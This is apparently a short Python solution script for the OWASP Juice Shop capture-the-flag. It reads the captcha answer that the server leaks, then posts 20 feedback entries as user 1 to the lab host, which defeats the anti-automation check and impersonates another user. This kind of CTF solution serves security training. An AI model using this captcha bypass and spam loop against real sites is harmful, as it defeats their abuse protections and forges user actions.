#!/usr/bin/env python3
import requests
import json

base = "https://2r6vj3sj0ysy2dnnl6bd.owasp-ctf.ownlab.fi"
captcha=f"{base}/rest/captcha"
posti=f"{base}/api/Feedbacks/"

r = requests.get(captcha)
c = json.loads(r.content)
id, answer = c['captchaId'], c['answer']

data = {"UserId":1,"captchaId":id,"captcha":f"{answer}","comment":"python-post (***in@juice-sh.op)","rating":1}

with requests.Session() as s:
    s.auth = ('a', 'a')
    for i in range(20):
        r = s.post(posti, data=data)


